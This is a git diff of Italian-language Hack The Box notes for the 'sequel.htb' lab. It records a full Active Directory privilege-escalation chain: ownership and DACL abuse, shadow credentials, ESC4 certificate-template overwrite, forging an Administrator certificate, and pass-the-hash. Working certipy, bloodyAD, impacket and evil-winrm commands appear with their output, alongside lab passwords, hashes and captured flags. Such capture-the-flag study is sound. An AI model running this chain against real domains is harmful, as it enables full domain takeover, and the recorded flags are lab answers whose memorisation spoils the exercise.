@@ -300,10 +300,16 @@ provo ad entrare su RYAN:
 
 > evil-winrm -i 10.10.11.51 -u "ryan" -p "WqSZAF6CysDQbGb3"
 
+# USER FLAG
+
+83fa321d74feb278c3067fa700bb99d9
+
+# PRIVESC
+
 > bloodhound-python -u ryan -p "WqSZAF6CysDQbGb3" -d sequel.htb -ns 10.10.11.51 -c All
 
 ryan ha i permessi di scrivere sulla certification authority -> puoi impostarlo come proprietario
-
+1. set ryan as ownser
 ` bloodyAD --host '10.10.11.51' -d 'escapetwo.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'`
 
 output
@@ -311,10 +317,15 @@ output
 
 modifico i permessi di accesso alle Discretional Access Control List (DACL)
 
+2. DACL
+`impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"`
+
 GET THE NTHASH of root:
 
+3. GET NTHASH
 `certipy-ad shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'`
-    
+
+## TENTATIVO 1   
 ```
 [*] Targeting user 'ca_svc'
 [*] Generating certificate
@@ -334,13 +345,219 @@ GET THE NTHASH of root:
 [*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
 ```
 
-trovo possibili exploit nei certificati
+## TENTATIVO 2
+```
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '138ae142-4e14-5bb7-86ac-0139a6a4a1fc'
+[*] Adding Key Credential with device ID '138ae142-4e14-5bb7-86ac-0139a6a4a1fc' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID '138ae142-4e14-5bb7-86ac-0139a6a4a1fc' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Using principal: ca_svc@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
+```
+
+## TENTATIVO 3
+```
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'fa529d3c-e2a4-1e6f-3600-cb02c898f2d1'
+[*] Adding Key Credential with device ID 'fa529d3c-e2a4-1e6f-3600-cb02c898f2d1' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID 'fa529d3c-e2a4-1e6f-3600-cb02c898f2d1' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Using principal: ca_svc@sequel.htb
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': None
+
+
+```
+## FINE TENTATIVI
+
+4. trovo possibili exploit nei certificati
 > KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout
 
 
+```
+[+] Domain retrieved from CCache: SEQUEL.HTB
+[+] Username retrieved from CCache: ca_svc
+[+] Trying to resolve 'dc01.sequel.htb' at '10.10.11.51'
+[+] Authenticating to LDAP server
+[+] Using Kerberos Cache: /home/carromano/My_ETH_Tool_list/HTB/VPN's Configurations/ca_svc.ccache
+[+] Using TGT from cache
+[+] Username retrieved from CCache: ca_svc
+[+] Getting TGS for 'host/dc01.sequel.htb'
+[+] Got TGS for 'host/dc01.sequel.htb'
+[+] Bound to ldap://10.10.11.51:389 - cleartext
+[+] Default path: DC=sequel,DC=htb
+[+] Configuration path: CN=Configuration,DC=sequel,DC=htb
+[+] Adding Domain Computers to list of current user's SIDs
+[+] List of current user's SIDs:
+     SEQUEL.HTB\Users (SEQUEL.HTB-S-1-5-32-545)
+     SEQUEL.HTB\Authenticated Users (SEQUEL.HTB-S-1-5-11)
+     SEQUEL.HTB\Denied RODC Password Replication Group (S-1-5-21-548670397-972687484-3496335370-572)
+     SEQUEL.HTB\Everyone (SEQUEL.HTB-S-1-1-0)
+     SEQUEL.HTB\Certification Authority (S-1-5-21-548670397-972687484-3496335370-1607)
+     SEQUEL.HTB\Domain Computers (S-1-5-21-548670397-972687484-3496335370-515)
+     SEQUEL.HTB\Domain Users (S-1-5-21-548670397-972687484-3496335370-513)
+     SEQUEL.HTB\Cert Publishers (S-1-5-21-548670397-972687484-3496335370-517)
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[+] Trying to resolve 'DC01.sequel.htb' at '10.10.11.51'
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
+[+] Trying to get DCOM connection for: 10.10.11.51
+[+] Using Kerberos Cache: /home/carromano/My_ETH_Tool_list/HTB/VPN's Configurations/ca_svc.ccache
+[+] Using TGT from cache
+[+] Username retrieved from CCache: ca_svc
+[+] Getting TGS for 'host/DC01.sequel.htb'
+[+] Got TGS for 'host/DC01.sequel.htb'
+[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
+[+] Using Kerberos Cache: /home/carromano/My_ETH_Tool_list/HTB/VPN's Configurations/ca_svc.ccache
+[+] Using TGT from cache
+[+] Username retrieved from CCache: ca_svc
+[+] Getting TGS for 'host/DC01.sequel.htb'
+[+] Got TGS for 'host/DC01.sequel.htb'
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[+] Connected to remote registry at 'DC01.sequel.htb' (10.10.11.51)
+[*] Got CA configuration for 'sequel-DC01-CA'
+[+] Resolved 'DC01.sequel.htb' from cache: 10.10.11.51
+[+] Connecting to 10.10.11.51:80
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC01-CA
+    DNS Name                            : DC01.sequel.htb
+    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
+    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
+    Certificate Validity End            : 2124-06-08 17:00:40+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : DunderMifflinAuthentication
+    Display Name                        : Dunder Mifflin Authentication
+    Certificate Authorities             : sequel-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectRequireCommonName
+                                          SubjectAltRequireDns
+    Enrollment Flag                     : AutoEnrollment
+                                          PublishToDs
+    Private Key Flag                    : 16842752
+    Extended Key Usage                  : Client Authentication
+                                          Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Enterprise Admins
+        Full Control Principals         : SEQUEL.HTB\Cert Publishers
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+        Write Property Principals       : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Administrator
+                                          SEQUEL.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
+```
+
+sovrascriviamo il certificato rilevato vulnerabile
+
+5. SOVRASCRIVO IL TEMPLATE DEL CERT
 > KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
 
+```
+[*] Updating certificate template 'DunderMifflinAuthentication'
+[*] Successfully updated 'DunderMifflinAuthentication'
+```
 
 
-> certipy-ad req -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
+attacco il cerberos usando l`hash delle credenziali di ca_svc:
 
+6. OTTENGO LE CRED DELL'ADMIN
+
+> certipy-ad req -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
+
+```
+[+] Trying to resolve 'DC01.sequel.htb' at '10.10.11.51'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.10.11.51[\pipe\cert]
+[*] Successfully requested certificate
+[*] Request ID is 50
+[*] Got certificate with multiple identifications
+    UPN: 'Administrator@sequel.htb'
+    DNS Host Name: '10.10.11.51'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator_10.pfx'
+```
+
+7. certipy-ad auth -pfx administrator_10.pfx  -domain sequel.htb
+
+```
+[*] Found multiple identifications in certificate
+[*] Please select one:
+    [0] UPN: 'Administrator@sequel.htb'
+    [1] DNS Host Name: '10.10.11.51'
+> 0
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+```
+
+8. evil-winrm -i 10.10.11.51 -u "administrator" -H "7a8d4e04986afa8ed4060f75e5a0b3ff"
+
+
+# ROOT FLAG
+
+4cc463607eb7929ce93d3435604fc803
